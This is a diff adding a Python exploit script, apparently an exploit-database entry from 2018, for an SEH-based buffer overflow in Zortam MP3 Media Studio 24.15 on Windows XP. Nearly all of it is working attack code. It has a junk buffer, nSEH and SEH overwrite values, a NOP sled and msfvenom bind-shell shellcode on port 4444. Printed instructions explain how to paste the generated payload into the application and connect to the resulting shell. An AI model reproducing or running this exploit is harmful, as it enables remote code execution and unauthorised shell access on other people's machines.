@@ -1,0 +1,89 @@
+#Exploit Title: Zortam MP3 Media Studio Version 24.15 Exploit (SEH)
+#Version:  24.15
+#Exploit Author: Manpreet Singh Kheberi
+#Date:  December 13 2018
+#Download Link: https://www.zortam.com/download.html
+#Vendor Homepage: https://www.zortam.com
+#Tested on:  Windows Xp Sp3 x64
+#Type: Bind shell
+print "-----------------------------------------------------------------------------------------------------------------------"
+print "                                      Zortam MP3 media studio Exploit  (SEH)      "
+print "                                      by Manpreet Singh Kheberi       "
+print "Generated File zortam-exploit.txt            "
+print "INSTRUCTIONS:" 
+print "Go to File > New mp3 Library > Yes > Paste the payload in select textfield > click ok > You have a shell on port 4444 "
+print "-----------------------------------------------------------------------------------------------------------------------"
+
+
+filename = "zortam-exploit.txt"
+junk = "\x41"*268
+nseh="\x90\x90\xeb\x12"
+
+seh ="\x8e\x32\xb5\x02" 
+
+nop="\x90"*19
+brk="\x90\x90\x90\x90"
+
+# bind shell generated using metasploit 
+#msfvenom -p windows/shell_bind_tcp LPORT=4444 -f python
+# This will open a bind shell on port 4444
+# use ncat Target-IP 4444
+
+buf =  ""
+buf += "\xda\xdf\xbd\xb7\x95\xd2\xc2\xd9\x74\x24\xf4\x5b\x33"
+buf += "\xc9\xb1\x53\x83\xeb\xfc\x31\x6b\x13\x03\xdc\x86\x30"
+buf += "\x37\xde\x41\x36\xb8\x1e\x92\x57\x30\xfb\xa3\x57\x26"
+buf += "\x88\x94\x67\x2c\xdc\x18\x03\x60\xf4\xab\x61\xad\xfb"
+buf += "\x1c\xcf\x8b\x32\x9c\x7c\xef\x55\x1e\x7f\x3c\xb5\x1f"
+buf += "\xb0\x31\xb4\x58\xad\xb8\xe4\x31\xb9\x6f\x18\x35\xf7"
+buf += "\xb3\x93\x05\x19\xb4\x40\xdd\x18\x95\xd7\x55\x43\x35"
+buf += "\xd6\xba\xff\x7c\xc0\xdf\x3a\x36\x7b\x2b\xb0\xc9\xad"
+buf += "\x65\x39\x65\x90\x49\xc8\x77\xd5\x6e\x33\x02\x2f\x8d"
+buf += "\xce\x15\xf4\xef\x14\x93\xee\x48\xde\x03\xca\x69\x33"
+buf += "\xd5\x99\x66\xf8\x91\xc5\x6a\xff\x76\x7e\x96\x74\x79"
+buf += "\x50\x1e\xce\x5e\x74\x7a\x94\xff\x2d\x26\x7b\xff\x2d"
+buf += "\x89\x24\xa5\x26\x24\x30\xd4\x65\x21\xf5\xd5\x95\xb1"
+buf += "\x91\x6e\xe6\x83\x3e\xc5\x60\xa8\xb7\xc3\x77\xcf\xed"
+buf += "\xb4\xe7\x2e\x0e\xc5\x2e\xf5\x5a\x95\x58\xdc\xe2\x7e"
+buf += "\x98\xe1\x36\xea\x90\x44\xe9\x09\x5d\x36\x59\x8e\xcd"
+buf += "\xdf\xb3\x01\x32\xff\xbb\xcb\x5b\x68\x46\xf4\x72\x35"
+buf += "\xcf\x12\x1e\xd5\x99\x8d\xb6\x17\xfe\x05\x21\x67\xd4"
+buf += "\x3d\xc5\x20\x3e\xf9\xea\xb0\x14\xad\x7c\x3b\x7b\x69"
+buf += "\x9d\x3c\x56\xd9\xca\xab\x2c\x88\xb9\x4a\x30\x81\x29"
+buf += "\xee\xa3\x4e\xa9\x79\xd8\xd8\xfe\x2e\x2e\x11\x6a\xc3"
+buf += "\x09\x8b\x88\x1e\xcf\xf4\x08\xc5\x2c\xfa\x91\x88\x09"
+buf += "\xd8\x81\x54\x91\x64\xf5\x08\xc4\x32\xa3\xee\xbe\xf4"
+buf += "\x1d\xb9\x6d\x5f\xc9\x3c\x5e\x60\x8f\x40\x8b\x16\x6f"
+buf += "\xf0\x62\x6f\x90\x3d\xe3\x67\xe9\x23\x93\x88\x20\xe0"
+buf += "\xa3\xc2\x68\x41\x2c\x8b\xf9\xd3\x31\x2c\xd4\x10\x4c"
+buf += "\xaf\xdc\xe8\xab\xaf\x95\xed\xf0\x77\x46\x9c\x69\x12"
+buf += "\x68\x33\x89\x37"
+
+#boom+= "\xCC\xCC\xCC\xCC"
+#calc.exe
+
+
+# Used for initial exploit development phase
+bchar = "x01x02x03x04x05x06x07x08x09x0ax0bx0cx0dx0ex0fx10"
+bchar += "x11x12x13x14x15x16x17x18x19x1ax1bx1cx1dx1ex1fx20"
+bchar +="x21x22x23x24x25x26x27x28x29x2ax2bx2cx2dx2ex2fx30"
+bchar +="x31x32x33x34x35x36x37x38x39x3ax3bx3cx3dx3ex3fx40"
+bchar +="x41x42x43x44x45x46x47x48x49x4ax4bx4cx4dx4ex4fx50"
+bchar +="x51x52x53x54x55x56x57x58x59x5ax5bx5cx5dx5ex5fx60"
+bchar +="x61x62x63x64x65x66x67x68x69x6ax6bx6cx6dx6ex6fx70"
+bchar +="x71x72x73x74x75x76x77x78x79x7ax7bx7cx7dx7ex7fx80"
+bchar +="x81x82x83x84x85x86x87x88x89x8ax8bx8cx8dx8ex8fx90"
+bchar +="x91x92x93x94x95x96x97x98x99x9ax9bx9cx9dx9ex9fxa0"
+bchar +="xa1xa2xa3xa4xa5xa6xa7xa8xa9xaaxabxacxadxaexafxb0"
+bchar +="xb1xb2xb3xb4xb5xb6xb7xb8xb9xbaxbbxbcxbdxbexbfxc0"
+bchar +="xc1xc2xc3xc4xc5xc6xc7xc8xc9xcaxcbxccxcdxcexcfxd0"
+bchar +="xd1xd2xd3xd4xd5xd6xd7xd8xd9xdaxdbxdcxddxdexdfxe0"
+bchar +="xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0"
+bchar +="xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"
+
+
+ 
+exploit = junk+nseh+seh+nop+brk+buf
+textfile = open(filename,"w")
+textfile.write(exploit)
+textfile.close()
